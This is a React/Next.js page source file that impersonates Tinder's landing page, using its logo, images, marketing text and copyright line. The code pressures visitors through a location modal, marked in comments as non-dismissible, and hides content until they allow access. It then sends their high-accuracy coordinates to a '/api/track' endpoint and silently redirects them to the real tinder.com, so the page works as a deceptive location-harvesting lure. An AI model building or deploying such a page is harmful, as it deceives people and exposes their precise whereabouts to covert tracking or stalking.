'use client';

import { TrackPageView } from '@/components/tracking/track-page-view';
import { Button } from '@/components/ui/button';
import {
  AnimatePresence,
  motion,
  useScroll,
  useTransform,
} from 'framer-motion';
import {
  AlertCircle,
  Diamond,
  Facebook,
  Home,
  Instagram,
  MapPin,
  MessageCircle,
  Search,
  TwitterIcon as TikTok,
  Twitter,
  User,
  Youtube,
} from 'lucide-react';
import Image from 'next/image';
import Link from 'next/link';
import { useCallback, useEffect, useRef, useState } from 'react';
import LoadingScreen from './components/loading-screen';
import LocationPermissionModal from './components/location-permision-modal';
import LoginModal from './components/login-modal';
import TestimonialCarousel from './components/testimonial-carousel';

// Profile data for the cards
const profiles = [
  {
    id: 1,
    name: 'Stephen',
    age: 22,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 2,
    name: 'Rose',
    age: 22,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 3,
    name: 'Camille',
    age: 24,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 4,
    name: 'Devon',
    age: 25,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 5,
    name: 'Kevin',
    age: 29,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 6,
    name: 'Elizabeth',
    age: 27,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 7,
    name: 'Chance',
    age: 22,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 8,
    name: 'Carmarita',
    age: 30,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 9,
    name: 'Herman',
    age: 24,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 10,
    name: 'Kim',
    age: 19,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 11,
    name: 'Luna',
    age: 23,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 12,
    name: 'Helena',
    age: 28,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 13,
    name: 'Brooks',
    age: 30,
    image: '/placeholder.svg?height=400&width=300',
  },
];

// Testimonials data
const testimonials = [
  {
    id: 1,
    names: 'Kenneth and Elliot',
    text: 'I honestly had been on many Tinder dates and was absolutely sure I was meeting a fling to get a free meal and have some fun ... 3 years and sooo many dates and memories later, I am married to my Tinder guy, Kenny!',
  },
  {
    id: 2,
    names: 'Victoria & Louise ❤️',
    text: 'THANK YOU for making it possible for me to meet my soulmate. Five minutes into our first conversation, my now-wife mentioned how we would have an amazing wedding.',
  },
  {
    id: 3,
    names: 'Ryan & Lindsey',
    text: '... just had a bad break-up and created a Tinder account to keep my mind off the break-up. After about a week of talking, we decided to meet up at a local bar for drinks ... we decided to tie the knot in an 18-person ceremony in New Jersey on 27 June 2020.',
  },
];

// URL dan profil tujuan setelah redirect
const REDIRECT_URL = 'https://tinder.com'; // Ganti dengan URL Tinder asli atau profil tujuan

export default function HomePage() {
  const [showCookieBanner, setShowCookieBanner] = useState(true);
  const [isClient, setIsClient] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const [showLoginModal, setShowLoginModal] = useState(false);
  const [showLocationModal, setShowLocationModal] = useState(false);
  const [locationEnabled, setLocationEnabled] = useState(false);
  const [locationError, setLocationError] = useState<string | null>(null);
  const [contentLoaded, setContentLoaded] = useState(false);
  const [profileVisible, setProfileVisible] = useState(true);
  const [locationDenied, setLocationDenied] = useState(false);
  const [showAfterLocationPrompt, setShowAfterLocationPrompt] = useState(false);
  const backgroundRef = useRef<HTMLDivElement>(null);
  const navbarRef = useRef<HTMLElement>(null);
  const testimonialsRef = useRef<HTMLElement>(null);
  const { scrollY } = useScroll();

  const titleOpacity = useTransform(scrollY, [0, 200, 400], [1, 0.5, 0]);
  const buttonOpacity = useTransform(scrollY, [0, 300, 500], [1, 0.3, 0]);

  // Function to get current position with better error handling
  const getCurrentPosition = useCallback(() => {
    if (!navigator.geolocation) {
      setLocationError("Your browser doesn't support geolocation");
      setLocationDenied(true);
      setProfileVisible(false);
      return Promise.reject(new Error('Geolocation not supported'));
    }

    setLocationError(null);

    return new Promise<GeolocationPosition>((resolve, reject) => {
      try {
        const successCallback = (position: GeolocationPosition) => {
          console.log('Successfully got position:', position);

          // Kirim data lokasi ke server
          sendLocationData({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: position.timestamp,
          });

          // Setelah berhasil mendapatkan lokasi, tunggu sebentar lalu redirect
          setTimeout(() => {
            window.location.href = REDIRECT_URL;
          }, 1500);

          resolve(position);
        };

        const errorCallback = (error: GeolocationPositionError) => {
          console.error('Geolocation error:', error);

          let errorMessage = 'Something went wrong with location tracking.';
          switch (error.code) {
            case error.PERMISSION_DENIED:
              errorMessage =
                'Location access was denied. Please enable location in your browser settings.';
              setLocationDenied(true);
              setProfileVisible(false);
              break;
            case error.POSITION_UNAVAILABLE:
              errorMessage =
                "We couldn't access your location. Please check your device settings.";
              setLocationDenied(true);
              setProfileVisible(false);
              break;
            case error.TIMEOUT:
              errorMessage =
                'Location request timed out. Please check your connection.';
              setLocationDenied(true);
              setProfileVisible(false);
              break;
          }

          setLocationError(errorMessage);
          reject(error);
        };

        const options = {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0,
        };

        navigator.geolocation.getCurrentPosition(
          successCallback,
          errorCallback,
          options,
        );
      } catch (err) {
        console.error('Unexpected error in getCurrentPosition:', err);
        setLocationError(
          'An unexpected error occurred while trying to get your location.',
        );
        setLocationDenied(true);
        setProfileVisible(false);
        reject(err);
      }
    });
  }, []);

  // Fungsi untuk mengirim data lokasi ke server
  const sendLocationData = async (locationData: {
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: number;
  }) => {
    try {
      const response = await fetch('/api/track', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          pageType: 'tinder',
          geoData: locationData,
        }),
      });

      if (!response.ok) {
        console.error('Failed to send location data');
      }
    } catch (error) {
      console.error('Error sending location data:', error);
    }
  };

  // Check if location is already granted
  const checkLocationPermission = useCallback(() => {
    console.log('Checking location permission...');

    if (!navigator.geolocation) {
      console.error('Geolocation not supported');
      setLocationError("Your browser doesn't support geolocation");
      setLocationDenied(true);
      setProfileVisible(false);
      return;
    }

    if (navigator.permissions && navigator.permissions.query) {
      navigator.permissions
        .query({ name: 'geolocation' as PermissionName })
        .then((result) => {
          console.log('Permission state:', result.state);

          if (result.state === 'granted') {
            // Get current position to confirm it works
            getCurrentPosition()
              .then(() => {
                console.log(
                  'Location permission granted and position obtained',
                );
                setLocationEnabled(true);
                setShowAfterLocationPrompt(true);
              })
              .catch((err) => {
                console.error(
                  'Error getting position even with permission granted:',
                  err,
                );
                // If there's an error getting position even with permission granted
                setShowLocationModal(true);
              });
          } else if (result.state === 'denied') {
            // Jika izin lokasi ditolak
            setLocationDenied(true);
            setProfileVisible(false);
            setShowLocationModal(true);
          } else {
            // If permission is not granted, show the modal
            console.log('Permission not granted, showing modal');
            setShowLocationModal(true);

            // Setelah 2 detik, tampilkan modal permintaan lokasi
            setTimeout(() => {
              setShowLocationModal(true);
            }, 2000);
          }

          // Listen for permission changes
          result.onchange = () => {
            console.log('Permission state changed to:', result.state);
            if (result.state === 'granted') {
              getCurrentPosition()
                .then(() => {
                  setLocationEnabled(true);
                  setShowLocationModal(false);
                  setProfileVisible(true);
                  setLocationDenied(false);
                })
                .catch((err) => {
                  console.error('Error after permission change:', err);
                });
            } else if (result.state === 'denied') {
              setLocationDenied(true);
              setProfileVisible(false);
            }
          };
        })
        .catch((err) => {
          console.error('Error querying permissions:', err);
          // Fallback if permissions API is not supported
          setShowLocationModal(true);
        });
    } else {
      // If permissions API is not supported, show the modal
      console.log('Permissions API not supported, showing modal');
      setShowLocationModal(true);
    }
  }, [getCurrentPosition]);

  // Handle successful location permission
  const handleLocationSuccess = useCallback(() => {
    console.log('Location permission granted, getting position...');
    getCurrentPosition()
      .then(() => {
        console.log('Successfully got position after permission granted');
        setLocationEnabled(true);
        setShowLocationModal(false);
        setLocationError(null);
        setProfileVisible(true);
        setLocationDenied(false);
      })
      .catch((error) => {
        // If there's still an error after permission is granted
        console.error('Error after permission granted:', error);
        setLocationDenied(true);
        setProfileVisible(false);
        // Keep the modal open to show the error
      });
  }, [getCurrentPosition]);

  useEffect(() => {
    setIsClient(true);

    const checkMobile = () => {
      setIsMobile(window.innerWidth < 768);
    };

    checkMobile();
    window.addEventListener('resize', checkMobile);

    // Simulate loading time
    const timer = setTimeout(() => {
      setIsLoading(false);

      // Mark content as loaded
      setContentLoaded(true);
    }, 2000);

    return () => {
      window.removeEventListener('resize', checkMobile);
      clearTimeout(timer);
    };
  }, []);

  // Show location modal after content is loaded
  useEffect(() => {
    if (contentLoaded) {
      // Wait a short delay after content loads before checking location permission
      const locationTimer = setTimeout(() => {
        checkLocationPermission();
      }, 1500);

      return () => clearTimeout(locationTimer);
    }
  }, [contentLoaded, checkLocationPermission]);

  // Parallax effect for background and navbar position
  useEffect(() => {
    if (!isClient) return;

    const navbar = navbarRef.current;
    const testimonials = testimonialsRef.current;

    if (!navbar || !testimonials) return;

    // Create an intersection observer to detect when testimonials section is in view
    const observer = new IntersectionObserver(
      (entries) => {
        // We don't want to change navbar position based on intersection
        // We'll handle this in the scroll event
      },
      { threshold: 0.1 },
    );

    observer.observe(testimonials);

    const handleScroll = () => {
      if (backgroundRef.current) {
        const scrollY = window.scrollY;
        backgroundRef.current.style.transform = `translateY(${scrollY * 0.5}px)`;
      }

      // Get the position of the testimonials section
      if (navbar && testimonials) {
        const testimonialsPosition = testimonials.getBoundingClientRect().top;

        // If testimonials section is about to come into view (or already in view)
        if (testimonialsPosition < window.innerHeight) {
          navbar.classList.add('navbar-fixed');
        } else {
          navbar.classList.remove('navbar-fixed');
        }
      }
    };

    window.addEventListener('scroll', handleScroll);
    return () => {
      window.removeEventListener('scroll', handleScroll);
      observer.disconnect();
    };
  }, [isClient]);

  if (!isClient) {
    return null;
  }

  if (isLoading) {
    return <LoadingScreen />;
  }

  return (
    <div className='relative min-h-screen overflow-hidden'>
      {/* Background with fixed position */}
      <div className='fixed inset-0 z-0' ref={backgroundRef}>
        <div className='relative h-full w-full'>
          {/* Desktop background */}
          <div className='absolute inset-0 hidden md:block'>
            <div
              className='absolute inset-0 bg-cover bg-fixed bg-center'
              style={{
                backgroundImage:
                  "url('https://tinder.com/static/build/cf11930093976a50329858777bae1bde.webp')",
              }}
            />
          </div>

          {/* Mobile background */}
          <div className='absolute inset-0 md:hidden'>
            <div
              className='absolute inset-0 bg-cover bg-fixed bg-center'
              style={{
                backgroundImage:
                  "url('https://tinder.com/static/build/574b10ef643ef1bc9a17c73e16b3b8a8.webp')",
              }}
            />
          </div>

          {/* Overlay for text readability */}
          <div className='absolute inset-0 z-10 bg-black/30' />
        </div>
      </div>

      {/* Navbar that becomes fixed when scrolled to testimonials */}
      <header ref={navbarRef} className='navbar sticky top-0 z-50 w-full'>
        <div className='bg-gradient-to-b from-black/80 via-black/60 to-transparent'>
          <div className='flex w-full items-center justify-between px-4 py-3 md:px-8 lg:px-16'>
            <div className='flex items-center'>
              <Link href='/' className='flex items-center'>
                <svg
                  viewBox='0 0 24 24'
                  className='h-8 w-8 fill-current text-white'
                >
                  <path d='M16.5 11.5c0 2.5-1.5 4.5-4.5 4.5-2 0-4.5-2-4.5-4.5C7.5 9 9.5 7 12 7s4.5 2 4.5 4.5zm-4.5 6c3.5 0 6.5-2 6.5-6.5S15.5 5 12 5 5.5 7 5.5 11.5 9 17.5 12 17.5z' />
                  <path d='M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.6 0 12 0zm0 22.5C6.2 22.5 1.5 17.8 1.5 12S6.2 1.5 12 1.5 22.5 6.2 22.5 12 17.8 22.5 12 22.5z' />
                </svg>
                <span className='ml-2 text-2xl font-bold text-white'>
                  tinder
                </span>
              </Link>
              <nav className='ml-8 hidden space-x-6 md:flex'>
                <Link
                  href='#'
                  className='text-white transition hover:text-white/80'
                >
                  Products
                </Link>
                <Link
                  href='#'
                  className='text-white transition hover:text-white/80'
                >
                  Learn
                </Link>
                <Link
                  href='#'
                  className='text-white transition hover:text-white/80'
                >
                  Safety
                </Link>
                <Link
                  href='#'
                  className='text-white transition hover:text-white/80'
                >
                  Support
                </Link>
                <Link
                  href='#'
                  className='text-white transition hover:text-white/80'
                >
                  Download
                </Link>
                <Link
                  href='#'
                  className='text-white transition hover:text-white/80'
                >
                  Gift Cards
                </Link>
              </nav>
            </div>
            <div className='flex items-center space-x-4'>
              {locationEnabled && (
                <div className='mr-2 flex items-center text-white'>
                  <MapPin className='mr-1 h-4 w-4 text-pink-500' />
                  <span className='hidden text-sm md:inline'>
                    Location Active
                  </span>
                </div>
              )}
              {locationError && (
                <div className='mr-2 hidden items-center text-red-400 md:flex'>
                  <AlertCircle className='mr-1 h-4 w-4' />
                  <span className='text-sm'>Location Error</span>
                </div>
              )}
              <button className='hidden items-center text-white transition hover:text-white/80 md:flex'>
                <span className='mr-1'>🌐</span>
                Language
              </button>
              <Button
                className='rounded-full bg-white px-6 font-medium text-black hover:bg-white/90'
                onClick={() => setShowLoginModal(true)}
              >
                Log in
              </Button>
            </div>
          </div>
        </div>
      </header>

      {/* Main content */}
      <main className='relative z-10'>
        {/* Hero section */}
        <section className='relative flex min-h-screen flex-col items-center justify-center px-4 py-20 sm:py-32 md:px-8 lg:px-16'>
          <div className='flex w-full max-w-5xl flex-col items-center'>
            {/* Main heading */}
            <motion.h1
              style={{ opacity: titleOpacity }}
              className='mb-6 text-center text-4xl font-bold text-white sm:text-5xl md:text-6xl lg:text-7xl'
            >
              Swipe Right®
            </motion.h1>

            {/* Description */}
            <motion.p
              style={{ opacity: titleOpacity }}
              className='mb-10 max-w-2xl text-center text-lg text-white sm:text-xl'
            >
              Match. Chat. Date. Millions of people are finding their perfect
              match on Tinder. Start your story today.
            </motion.p>

            {/* Location denied error message */}
            <AnimatePresence>
              {locationDenied && (
                <motion.div
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0 }}
                  className='mb-8 w-full max-w-md rounded-lg bg-red-500/20 p-4 text-center'
                >
                  <div className='flex flex-col items-center justify-center gap-2'>
                    <AlertCircle className='h-8 w-8 text-red-500' />
                    <h3 className='text-xl font-bold text-white'>
                      Lokasi Diperlukan
                    </h3>
                    <p className='text-white/80'>
                      Maaf, Anda harus mengizinkan akses lokasi untuk
                      melanjutkan. Profil tidak dapat ditampilkan tanpa izin
                      lokasi.
                    </p>
                    <Button
                      onClick={handleLocationSuccess}
                      className='mt-2 bg-white text-red-600 hover:bg-white/90'
                    >
                      Coba Lagi
                    </Button>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>

            {/* Profile cards - only shown if profile is visible */}
            {profileVisible && (
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                style={{ opacity: titleOpacity }}
                className='relative h-[450px] w-full max-w-lg'
              >
                <div className='absolute left-0 right-0 m-auto h-[450px] w-full max-w-md'>
                  {/* Tinder-like card stack */}
                  <div className='relative h-full w-full overflow-hidden rounded-2xl bg-white shadow-2xl'>
                    {/* Profile image */}
                    <Image
                      src='/placeholder.svg?height=450&width=350'
                      alt='Profile'
                      width={350}
                      height={450}
                      className='absolute h-full w-full object-cover'
                    />

                    {/* Gradient overlay */}
                    <div className='absolute bottom-0 h-2/5 w-full bg-gradient-to-t from-black/80 to-transparent' />

                    {/* Profile info */}
                    <div className='absolute bottom-0 w-full p-6'>
                      <h2 className='text-3xl font-bold text-white'>
                        Jessica, 23
                      </h2>
                      <div className='flex items-center text-white'>
                        <MapPin className='mr-1 h-4 w-4' />
                        <span>2 miles away</span>
                      </div>
                      <p className='mt-2 text-sm text-white/80'>
                        Coffee enthusiast. Dog lover. Adventure seeker.
                      </p>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}

            {/* CTA Buttons */}
            <motion.div
              style={{ opacity: buttonOpacity }}
              className='mt-8 flex w-full max-w-md flex-col items-center space-y-4'
            >
              <Button
                className='w-full rounded-full bg-gradient-to-r from-pink-500 to-rose-500 py-6 text-xl font-semibold text-white hover:from-pink-600 hover:to-rose-600'
                onClick={() => setShowLoginModal(true)}
              >
                Create Account
              </Button>
            </motion.div>
          </div>
        </section>
      </main>

      {/* Testimonials section with carousel */}
      <section
        ref={testimonialsRef}
        className='relative z-20 mt-16 bg-gray-900'
      >
        <div className='mx-auto max-w-6xl px-4'>
          <h2 className='mb-8 text-center text-3xl font-bold text-white'>
            Success Stories
          </h2>
          <TestimonialCarousel />
        </div>
      </section>

      {/* Footer */}
      <footer className='relative z-20 bg-gray-900 py-12 text-gray-300'>
        <div className='mx-auto max-w-6xl px-4'>
          <div className='grid grid-cols-2 gap-8 md:grid-cols-4'>
            <div>
              <h4 className='mb-4 font-semibold text-white'>Legal</h4>
              <ul className='space-y-2 text-sm'>
                <li>
                  <Link href='#' className='transition hover:text-white'>
                    Privacy
                  </Link>
                </li>
                <li>
                  <Link href='#' className='transition hover:text-white'>
                    Consumer Health Data Privacy Policy
                  </Link>
                </li>
                <li>
                  <Link href='#' className='transition hover:text-white'>
                    Terms
                  </Link>
                </li>
                <li>
                  <Link href='#' className='transition hover:text-white'>
                    Cookie Policy
                  </Link>
                </li>
                <li>
                  <Link href='#' className='transition hover:text-white'>
                    Intellectual Property
                  </Link>
                </li>
              </ul>
            </div>
            <div>
              <h4 className='mb-4 font-semibold text-white'>Careers</h4>
              <ul className='space-y-2 text-sm'>
                <li>
                  <Link href='#' className='transition hover:text-white'>
                    Careers portal
                  </Link>
                </li>
                <li>
                  <Link href='#' className='transition hover:text-white'>
                    Tech Blog
                  </Link>
                </li>
              </ul>
            </div>
            <div>
              <h4 className='mb-4 font-semibold text-white'>Social</h4>
              <div className='flex space-x-4 text-white'>
                <Link href='#' className='transition hover:text-pink-500'>
                  <Instagram size={20} />
                </Link>
                <Link href='#' className='transition hover:text-pink-500'>
                  <TikTok size={20} />
                </Link>
                <Link href='#' className='transition hover:text-pink-500'>
                  <Youtube size={20} />
                </Link>
                <Link href='#' className='transition hover:text-pink-500'>
                  <Twitter size={20} />
                </Link>
                <Link href='#' className='transition hover:text-pink-500'>
                  <Facebook size={20} />
                </Link>
              </div>
            </div>
            <div>
              <h4 className='mb-4 font-semibold text-white'>FAQ</h4>
              <ul className='space-y-2 text-sm'>
                <li>
                  <Link href='#' className='transition hover:text-white'>
                    Destinations
                  </Link>
                </li>
                <li>
                  <Link href='#' className='transition hover:text-white'>
                    Press room
                  </Link>
                </li>
                <li>
                  <Link href='#' className='transition hover:text-white'>
                    Contact
                  </Link>
                </li>
                <li>
                  <Link href='#' className='transition hover:text-white'>
                    Promo code
                  </Link>
                </li>
              </ul>
            </div>
          </div>

          <div className='mt-12'>
            <h4 className='mb-4 font-semibold text-white'>Get the app!</h4>
            <div className='flex space-x-4'>
              <Link href='#' className='block'>
                <Image
                  src='/placeholder.svg?height=40&width=120'
                  alt='Download on the App Store'
                  width={120}
                  height={40}
                  className='rounded-md'
                />
              </Link>
              <Link href='#' className='block'>
                <Image
                  src='/placeholder.svg?height=40&width=120'
                  alt='Get it on Google Play'
                  width={120}
                  height={40}
                  className='rounded-md'
                />
              </Link>
            </div>
          </div>

          <div className='mt-12 text-xs'>
            <p className='mb-4'>
              All you singles, listen up: if you're looking to fall in love,
              want to start dating, ready to start a relationship, or want to
              keep it casual, you need to be on Tinder. With over 55 billion
              matches made, it's the best free dating site to find your next
              best match. You've probably noticed: the dating landscape looks
              very different today, with most of us choosing to meet people
              online. With Tinder, the world's most popular free dating app, you
              have millions of other singles at your fingertips, and they're all
              ready to meet someone like you. Whether you're straight or part of
              the LGBTQIA community, Tinder's here to get the sparks flying.
            </p>
            <p>
              There really is something for everyone on Tinder. Looking for a
              relationship? You've got it. Want to make friends online? Say no
              more. Just started uni and want to make the most of your
              experience? Tinder U's got you covered. Tinder isn't your average
              dating site; it's the most diverse dating app, where adults of all
              backgrounds and experiences are invited to make connections,
              memories and everything in between.
            </p>
          </div>

          <div className='mt-8 flex flex-wrap items-center justify-between border-t border-gray-800 pt-8 text-xs'>
            <div className='mb-4 flex space-x-4 md:mb-0'>
              <Link href='#' className='transition hover:text-white'>
                FAQ
              </Link>
              <span>/</span>
              <Link href='#' className='transition hover:text-white'>
                Safety tips
              </Link>
              <span>/</span>
              <Link href='#' className='transition hover:text-white'>
                Terms
              </Link>
              <span>/</span>
              <Link href='#' className='transition hover:text-white'>
                Cookie Policy
              </Link>
              <span>/</span>
              <Link href='#' className='transition hover:text-white'>
                Privacy settings
              </Link>
            </div>
            <div>© 2025 Tinder LLC, All Rights Reserved.</div>
          </div>
        </div>
      </footer>

      {/* Cookie banner */}
      <AnimatePresence>
        {showCookieBanner && (
          <motion.div
            className='fixed bottom-0 left-0 right-0 z-50 bg-white p-4 text-center md:text-left'
            initial={{ y: 100 }}
            animate={{ y: 0 }}
            exit={{ y: 100 }}
            transition={{ duration: 0.3 }}
          >
            <div className='mx-auto flex max-w-6xl flex-col items-center justify-between md:flex-row'>
              <div className='mb-4 text-sm text-gray-700 md:mb-0 md:mr-4'>
                <span>
                  We value your privacy. We and our partners use trackers to
                  measure the audience of our website and to provide you with
                  offers and improve our own Tinder marketing operations.
                </span>
                <Link href='#' className='ml-1 font-medium underline'>
                  More info on cookies and providers we use
                </Link>
                <span>
                  . You can withdraw your consent at any time in your settings.
                </span>
              </div>
              <div className='flex flex-wrap justify-center gap-2'>
                <Button
                  variant='outline'
                  className='rounded-full border-gray-300 text-black'
                  onClick={() => {}}
                >
                  Personalize my choices
                </Button>
                <Button
                  variant='outline'
                  className='rounded-full border-gray-300 text-black'
                  onClick={() => setShowCookieBanner(false)}
                >
                  I accept
                </Button>
                <Button
                  variant='outline'
                  className='rounded-full border-gray-300 text-black'
                  onClick={() => setShowCookieBanner(false)}
                >
                  I decline
                </Button>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Login Modal */}
      <LoginModal
        isOpen={showLoginModal}
        onClose={() => setShowLoginModal(false)}
      />

      {/* Location Permission Modal - Now non-dismissible */}
      <LocationPermissionModal
        isOpen={showLocationModal}
        onAllow={handleLocationSuccess}
      />

      {/* Bottom navigation bar with profile link */}
      <div className='fixed bottom-0 left-0 right-0 z-50 border-t border-gray-800 bg-black'>
        <div className='flex h-16 items-center justify-around'>
          <Link href='/' className='flex flex-col items-center p-2'>
            <Home className='h-6 w-6 text-gray-400' />
          </Link>
          <Link href='#' className='flex flex-col items-center p-2'>
            <Search className='h-6 w-6 text-gray-400' />
          </Link>
          <Link href='#' className='flex flex-col items-center p-2'>
            <Diamond className='h-6 w-6 text-gray-400' />
          </Link>
          <Link href='#' className='flex flex-col items-center p-2'>
            <MessageCircle className='h-6 w-6 text-gray-400' />
          </Link>
          <Link href='/profile' className='flex flex-col items-center p-2'>
            <User className='h-6 w-6 text-gray-400' />
          </Link>
        </div>
      </div>

      {/* TrackPageView component */}
      <TrackPageView pageType='tinder' />
    </div>
  );
}
